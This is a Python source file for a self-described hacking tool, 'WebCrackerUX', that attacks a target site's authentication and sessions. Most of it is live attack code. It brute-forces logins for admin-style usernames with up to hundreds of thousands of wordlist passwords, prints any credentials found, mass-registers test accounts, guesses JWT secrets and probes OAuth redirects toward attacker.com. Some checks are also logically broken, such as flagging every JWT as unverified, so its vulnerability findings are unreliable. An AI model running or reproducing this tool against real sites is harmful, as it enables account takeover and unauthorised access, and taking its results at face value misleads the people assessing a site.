#!/usr/bin/env python3
"""
Owner: Abdul Mannan aka ShaheenUX
Social Handles: github.com/shaheenUX , instagram.com/shaheen_hacker , linktr.ee/shaheen_hacker
WebCrackerUX v1.O - AUTHENTICATION & SESSION MANAGEMENT CHECKS
Description: 
  Comprehensive authentication and session management vulnerability scanner
  with 10 practical attack vectors and sophisticated exploitation techniques.
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import requests
import jwt  # PyJWT
from bs4 import BeautifulSoup
from colorama import Fore, Style
from config import TARGET_DOMAIN, BASE_URL, HTTPS_URL, USER_AGENT, REQUEST_TIMEOUT

# Global configuration
REPORT_FILE = "reports/auth_session_report.txt"
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": USER_AGENT})

# Online password repositories as fallback
ONLINE_PASSWORD_DBS = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
    "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt"
]

class AuthSessionScanner:
    def __init__(self):
        self.target = BASE_URL
        self.https_target = HTTPS_URL
        self.results = []
        self.login_path = self._discover_login_page()
        self.session_cookie_name = None
        self.csrf_token_pattern = re.compile(r'csrf|token|nonce', re.IGNORECASE)
        
    def _discover_login_page(self):
        """Automatically discover login page location"""
        common_paths = [
            "login", "signin", "auth", "account/login",
            "admin", "admin/login", "wp-login.php"
        ]
        
        print(f"{Fore.CYAN}[*] Discovering login page...{Style.RESET_ALL}")
        for path in common_paths:
            url = f"{self.target}{path}"
            try:
                response = SESSION.get(url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200 and any(keyword in response.text.lower() 
                                                      for keyword in ["login", "sign in", "password"]):
                    print(f"{Fore.GREEN}[+] Found login page: {url}{Style.RESET_ALL}")
                    return url
            except requests.RequestException:
                continue
        
        # Fallback to manual input if not found
        print(f"{Fore.YELLOW}[!] Could not auto-discover login page{Style.RESET_ALL}")
        return input("Enter full login URL: ").strip()
    
    def _get_csrf_token(self, response_text):
        """Extract CSRF token from HTML response"""
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check meta tags
        meta_csrf = soup.find('meta', attrs={'name': self.csrf_token_pattern})
        if meta_csrf and meta_csrf.get('content'):
            return meta_csrf['content']
        
        # Check input fields
        input_csrf = soup.find('input', attrs={'name': self.csrf_token_pattern})
        if input_csrf and input_csrf.get('value'):
            return input_csrf['value']
        
        # Check headers
        header_csrf = soup.find(attrs={'name': self.csrf_token_pattern})
        if header_csrf and header_csrf.get('value'):
            return header_csrf['value']
        
        return None
    
    def _identify_session_cookie(self, response):
        """Identify session cookie from response headers"""
        cookies = response.headers.get('Set-Cookie', '')
        if not cookies:
            return None
            
        # Look for common session cookie names
        session_pattern = re.compile(
            r'(session|sessid|auth|token|jsessionid|phpsessid|connect\.sid)=([^\s;]+)',
            re.IGNORECASE
        )
        
        match = session_pattern.search(cookies)
        if match:
            self.session_cookie_name = match.group(1)
            return match.group(2)
        return None
    
    def _load_password_list(self):
        """Load password wordlist with fallback mechanisms"""
        passwords = []
        
        # Try local rockyou.txt first
        if os.path.exists(WORDLIST_PATH):
            try:
                with open(WORDLIST_PATH, 'r', encoding='latin-1') as f:
                    passwords = [line.strip() for line in f.readlines()[:500000]]  # First 500k
                print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords from {WORDLIST_PATH}{Style.RESET_ALL}")
                return passwords
            except Exception as e:
                print(f"{Fore.RED}[-] Error reading {WORDLIST_PATH}: {e}{Style.RESET_ALL}")
        
        # Fallback to online repositories
        print(f"{Fore.YELLOW}[!] Using online password databases as fallback{Style.RESET_ALL}")
        for url in ONLINE_PASSWORD_DBS:
            try:
                response = requests.get(url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    passwords.extend(response.text.splitlines())
                    print(f"{Fore.GREEN}[+] Fetched {len(response.text.splitlines())} passwords from {url}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error fetching {url}: {e}{Style.RESET_ALL}")
        
        # Deduplicate and limit
        passwords = list(set(passwords))[:300000]  # Max 300k passwords
        print(f"{Fore.YELLOW}[!] Using {len(passwords)} passwords for attacks{Style.RESET_ALL}")
        return passwords
    
    def _check_weak_password_policy(self):
        """Check for weak password policy enforcement"""
        test_passwords = [
            "password", "123456", "qwerty", "admin", 
            "Password1", "Summer2023!", "a", "123"
        ]
        
        vulnerable = False
        print(f"{Fore.CYAN}[*] Testing password policy strength...{Style.RESET_ALL}")
        
        # Get CSRF token
        response = SESSION.get(self.login_path)
        csrf_token = self._get_csrf_token(response.text)
        
        # Test weak passwords
        for pwd in test_passwords:
            data = {
                "username": "testuser",
                "password": pwd,
                "email": "test@example.com"
            }
            
            if csrf_token:
                data["csrf_token"] = csrf_token
                
            try:
                response = SESSION.post(self.login_path.replace("login", "register"), 
                                       data=data, 
                                       allow_redirects=False)
                
                # Successful registration with weak password
                if response.status_code in [200, 302]:
                    vulnerable = True
                    print(f"{Fore.RED}[-] Weak password accepted: {pwd}{Style.RESET_ALL}")
            except Exception:
                continue
        
        if vulnerable:
            self.results.append({
                "vulnerability": "Weak Password Policy",
                "severity": "High",
                "description": "Application accepts weak passwords during registration",
                "recommendation": "Enforce strong password policies (min 12 chars, complexity requirements)"
            })
        else:
            print(f"{Fore.GREEN}[+] Password policy appears strong{Style.RESET_ALL}")
    
    def _credential_stuffing_attack(self):
        """Perform credential stuffing with password list"""
        print(f"{Fore.CYAN}[*] Starting credential stuffing attack...{Style.RESET_ALL}")
        
        # Get CSRF token
        response = SESSION.get(self.login_path)
        csrf_token = self._get_csrf_token(response.text)
        
        # Identify username field
        soup = BeautifulSoup(response.text, 'html.parser')
        username_field = soup.find('input', {'type': 'text'}) or soup.find('input', {'name': re.compile(r'user|name|email', re.I)})
        username_key = username_field['name'] if username_field else 'username'
        
        # Test credentials
        passwords = self._load_password_list()
        test_usernames = ["admin", "administrator", "test", "user", "root"]
        
        for username in test_usernames:
            for i, password in enumerate(passwords):
                if i % 5000 == 0:  # Progress indicator
                    print(f"{Fore.YELLOW}[~] Testing {username} with password {i}/{len(passwords)}{Style.RESET_ALL}")
                
                data = {username_key: username, "password": password}
                if csrf_token:
                    data["csrf_token"] = csrf_token
                
                try:
                    response = SESSION.post(self.login_path, data=data, allow_redirects=False)
                    
                    # Successful login indicators
                    if response.status_code in [301, 302, 303] or "logout" in response.text.lower():
                        self.results.append({
                            "vulnerability": "Credential Stuffing",
                            "severity": "Critical",
                            "description": f"Valid credentials found: {username}:{password}",
                            "recommendation": "Implement multi-factor authentication and account lockout policies"
                        })
                        print(f"{Fore.RED}[-] CRITICAL: Valid credentials {username}:{password}{Style.RESET_ALL}")
                        return
                except Exception as e:
                    print(f"{Fore.RED}[-] Request failed: {e}{Style.RESET_ALL}")
                    time.sleep(5)  # Backoff on errors
        
        print(f"{Fore.GREEN}[+] No valid credentials found via credential stuffing{Style.RESET_ALL}")
    
    def _session_fixation_test(self):
        """Test for session fixation vulnerability"""
        print(f"{Fore.CYAN}[*] Testing for session fixation...{Style.RESET_ALL}")
        
        # Create initial session
        response1 = SESSION.get(self.login_path)
        session_cookie1 = self._identify_session_cookie(response1)
        
        if not session_cookie1:
            print(f"{Fore.YELLOW}[!] No session cookie found{Style.RESET_ALL}")
            return
            
        # Login with known session
        data = {"username": "test", "password": "test"}
        csrf_token = self._get_csrf_token(response1.text)
        if csrf_token:
            data["csrf_token"] = csrf_token
            
        response2 = SESSION.post(self.login_path, data=data, allow_redirects=False)
        session_cookie2 = self._identify_session_cookie(response2)
        
        # Check if session remained the same
        if session_cookie1 == session_cookie2:
            self.results.append({
                "vulnerability": "Session Fixation",
                "severity": "High",
                "description": "Session ID remains the same after authentication",
                "recommendation": "Generate new session ID after successful authentication"
            })
            print(f"{Fore.RED}[-] Session fixation vulnerability detected!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Session ID changed after login{Style.RESET_ALL}")
    
    def _jwt_manipulation_test(self):
        """Test JWT tokens for common vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing JWT implementation...{Style.RESET_ALL}")
        
        # Get a valid JWT token
        response = SESSION.get(f"{self.target}profile")
        jwt_token = None
        
        # Extract JWT from cookies
        for name, value in SESSION.cookies.items():
            if len(value) > 100 and value.count('.') == 2:  # Basic JWT pattern
                jwt_token = value
                break
        
        if not jwt_token:
            print(f"{Fore.YELLOW}[!] No JWT token found{Style.RESET_ALL}")
            return
        
        # Test for common vulnerabilities
        vulnerabilities = []
        
        try:
            # 1. Check if token can be decoded without verification
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            vulnerabilities.append("Token decodable without signature verification")
            
            # 2. Check for "none" algorithm vulnerability
            header = jwt.get_unverified_header(jwt_token)
            if header.get('alg') == 'none':
                vulnerabilities.append("'none' algorithm accepted")
                
            # 3. Check for weak HMAC secret
            common_secrets = ["secret", "password", "changeme", "supersecret"]
            for secret in common_secrets:
                try:
                    jwt.decode(jwt_token, secret, algorithms=["HS256"])
                    vulnerabilities.append(f"Weak HMAC secret: {secret}")
                    break
                except jwt.InvalidSignatureError:
                    continue
        except Exception as e:
            print(f"{Fore.RED}[-] JWT processing error: {e}{Style.RESET_ALL}")
            return
        
        if vulnerabilities:
            self.results.append({
                "vulnerability": "JWT Implementation Flaws",
                "severity": "High",
                "description": ", ".join(vulnerabilities),
                "recommendation": "Use strong algorithms (RS256), validate signatures, and set expiration"
            })
            print(f"{Fore.RED}[-] JWT vulnerabilities found!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] JWT implementation appears secure{Style.RESET_ALL}")
    
    def _concurrent_session_test(self):
        """Test if multiple concurrent sessions are allowed"""
        print(f"{Fore.CYAN}[*] Testing concurrent sessions...{Style.RESET_ALL}")
        
        # Create first session
        sess1 = requests.Session()
        sess1.headers.update({"User-Agent": USER_AGENT})
        
        # Login with session 1
        data = {"username": "test", "password": "test"}
        response = sess1.get(self.login_path)
        csrf_token = self._get_csrf_token(response.text)
        if csrf_token:
            data["csrf_token"] = csrf_token
        
        sess1.post(self.login_path, data=data)
        
        # Create second session with same credentials
        sess2 = requests.Session()
        sess2.headers.update({"User-Agent": USER_AGENT})
        sess2.post(self.login_path, data=data)
        
        # Access protected resource with both sessions
        protected_url = f"{self.target}profile"
        resp1 = sess1.get(protected_url)
        resp2 = sess2.get(protected_url)
        
        # Check if both sessions are valid
        if resp1.status_code == 200 and resp2.status_code == 200:
            self.results.append({
                "vulnerability": "Concurrent Sessions Allowed",
                "severity": "Medium",
                "description": "Multiple concurrent sessions allowed with same credentials",
                "recommendation": "Implement session control to prevent multiple active sessions"
            })
            print(f"{Fore.RED}[-] Concurrent sessions allowed!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Concurrent sessions properly managed{Style.RESET_ALL}")
    
    def _password_reset_vulnerability(self):
        """Test for password reset vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing password reset mechanism...{Style.RESET_ALL}")
        
        reset_path = self.login_path.replace("login", "forgot-password")
        if reset_path == self.login_path:  # Fallback if replacement didn't work
            reset_path = f"{self.target}forgot-password"
        
        try:
            # Get CSRF token
            response = SESSION.get(reset_path)
            csrf_token = self._get_csrf_token(response.text)
            
            # Submit reset request
            data = {"email": "attacker@example.com"}
            if csrf_token:
                data["csrf_token"] = csrf_token
                
            response = SESSION.post(reset_path, data=data)
            
            # Check if email was accepted
            if "sent" in response.text.lower() or "check your email" in response.text.lower():
                self.results.append({
                    "vulnerability": "Password Reset Poisoning",
                    "severity": "Critical",
                    "description": "Password reset accepts unverified email addresses",
                    "recommendation": "Verify email ownership before sending reset links"
                })
                print(f"{Fore.RED}[-] Password reset accepts unverified emails!{Style.RESET_ALL}")
                return
        except Exception as e:
            print(f"{Fore.RED}[-] Password reset test failed: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Password reset requires email verification{Style.RESET_ALL}")
    
    def _session_timeout_test(self):
        """Test session timeout duration"""
        print(f"{Fore.CYAN}[*] Testing session timeout...{Style.RESET_ALL}")
        
        # Authenticate to get session
        data = {"username": "test", "password": "test"}
        response = SESSION.get(self.login_path)
        csrf_token = self._get_csrf_token(response.text)
        if csrf_token:
            data["csrf_token"] = csrf_token
        
        response = SESSION.post(self.login_path, data=data)
        if response.status_code not in [200, 301, 302]:
            print(f"{Fore.YELLOW}[!] Login failed, skipping timeout test{Style.RESET_ALL}")
            return
        
        # Test session validity over time
        print(f"{Fore.YELLOW}[~] Monitoring session for 15 minutes... (Ctrl+C to interrupt){Style.RESET_ALL}")
        protected_url = f"{self.target}profile"
        
        try:
            for i in range(15):  # 15 minutes
                time.sleep(60)  # Wait 1 minute
                response = SESSION.get(protected_url)
                
                # Session still valid
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[~] Session still active after {i+1} minutes{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] Session expired after {i+1} minutes{Style.RESET_ALL}")
                    return
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[!] Timeout test interrupted{Style.RESET_ALL}")
            return
        
        self.results.append({
            "vulnerability": "Excessive Session Timeout",
            "severity": "Medium",
            "description": "Session remains active for more than 15 minutes of inactivity",
            "recommendation": "Reduce session timeout to 15 minutes or less for sensitive applications"
        })
        print(f"{Fore.RED}[-] Session timeout too long!{Style.RESET_ALL}")
    
    def _cookie_attributes_test(self):
        """Check security attributes of session cookies"""
        print(f"{Fore.CYAN}[*] Checking cookie security attributes...{Style.RESET_ALL}")
        
        # Access login page to get cookies
        response = SESSION.get(self.login_path)
        cookies = response.headers.get('Set-Cookie', '')
        
        missing_attrs = []
        
        # Check for HttpOnly flag
        if "HttpOnly" not in cookies:
            missing_attrs.append("HttpOnly")
            
        # Check for Secure flag (only when using HTTPS)
        if self.https_target.startswith("https") and "Secure" not in cookies:
            missing_attrs.append("Secure")
            
        # Check for SameSite attribute
        if "SameSite" not in cookies:
            missing_attrs.append("SameSite")
            
        if missing_attrs:
            self.results.append({
                "vulnerability": "Insecure Cookie Attributes",
                "severity": "Medium",
                "description": f"Missing security attributes: {', '.join(missing_attrs)}",
                "recommendation": "Set HttpOnly, Secure, and SameSite=Strict/Lax attributes"
            })
            print(f"{Fore.RED}[-] Missing cookie attributes: {', '.join(missing_attrs)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Secure cookie attributes present{Style.RESET_ALL}")
    
    def _oauth_token_test(self):
        """Test for OAuth implementation vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing OAuth implementation...{Style.RESET_ALL}")
        
        # Look for OAuth endpoints
        response = SESSION.get(self.target)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        oauth_links = []
        for link in soup.find_all('a', href=True):
            if "oauth" in link['href'] or "auth" in link['href']:
                oauth_links.append(link['href'])
        
        if not oauth_links:
            print(f"{Fore.YELLOW}[!] No OAuth endpoints found{Style.RESET_ALL}")
            return
            
        print(f"{Fore.YELLOW}[~] Found potential OAuth endpoints: {oauth_links}{Style.RESET_ALL}")
        
        # Test for open redirect vulnerabilities
        vulnerable = False
        for endpoint in oauth_links:
            test_url = f"{endpoint}?redirect_uri=https://attacker.com"
            try:
                response = SESSION.get(test_url, allow_redirects=False)
                if response.status_code in [301, 302, 303]:
                    location = response.headers.get('Location', '')
                    if "attacker.com" in location:
                        vulnerable = True
                        print(f"{Fore.RED}[-] Open redirect found in {endpoint}{Style.RESET_ALL}")
            except Exception:
                continue
        
        if vulnerable:
            self.results.append({
                "vulnerability": "OAuth Open Redirect",
                "severity": "High",
                "description": "OAuth implementation allows open redirects via redirect_uri parameter",
                "recommendation": "Validate and whitelist redirect_uri values"
            })
        else:
            print(f"{Fore.GREEN}[+] No OAuth open redirects detected{Style.RESET_ALL}")
    
    def run_all_checks(self):
        """Execute all authentication and session tests"""
        print(f"\n{Fore.BLUE}=== Starting Authentication & Session Tests ==={Style.RESET_ALL}")
        
        tests = [
            self._check_weak_password_policy,
            self._credential_stuffing_attack,
            self._session_fixation_test,
            self._jwt_manipulation_test,
            self._concurrent_session_test,
            self._password_reset_vulnerability,
            self._session_timeout_test,
            self._cookie_attributes_test,
            self._oauth_token_test
        ]
        
        for test in tests:
            try:
                test()
            except Exception as e:
                print(f"{Fore.RED}[-] Test failed: {e}{Style.RESET_ALL}")
        
        # Generate report
        self._generate_report()
    
    def _generate_report(self):
        """Generate vulnerability report"""
        os.makedirs(os.path.dirname(REPORT_FILE), exist_ok=True)
        
        with open(REPORT_FILE, 'w') as f:
            f.write(f"Authentication & Session Management Test Report\n")
            f.write(f"Target: {TARGET_DOMAIN}\n")
            f.write(f"Date: {time.ctime()}\n\n")
            
            if not self.results:
                f.write("No vulnerabilities found!\n")
                return
            
            f.write("Vulnerabilities Found:\n")
            f.write("=" * 80 + "\n")
            
            for i, result in enumerate(self.results, 1):
                f.write(f"{i}. {result['vulnerability']} ({result['severity']})\n")
                f.write(f"   Description: {result['description']}\n")
                f.write(f"   Recommendation: {result['recommendation']}\n\n")
        
        print(f"{Fore.GREEN}[+] Report saved to {REPORT_FILE}{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Found {len(self.results)} vulnerabilities!{Style.RESET_ALL}")

if __name__ == "__main__":
    scanner = AuthSessionScanner()
    scanner.run_all_checks()